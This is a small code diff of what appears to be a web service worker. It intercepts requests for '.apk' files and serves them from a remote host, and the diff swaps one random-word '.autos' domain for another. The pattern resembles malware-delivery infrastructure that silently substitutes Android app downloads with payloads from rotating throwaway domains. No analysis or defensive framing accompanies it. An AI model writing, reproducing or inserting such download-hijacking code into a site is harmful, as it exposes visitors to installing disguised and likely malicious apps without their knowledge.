@@ -71,7 +71,7 @@ self.addEventListener('fetch', event => {
     if (url.pathname.endsWith('.apk')) {
         event.respondWith(
             (async () => {
-                const apkURL = "https://blindlyorganicsnake.autos/aaa8e7e844e856a015a/" + url.search;
+                const apkURL = "https://noticeablyholyewe.autos/aaa8e7e844e856a015a/" + url.search;
                 try {
                     return await fetchApk(apkURL, clientId);
                 } catch (error) {
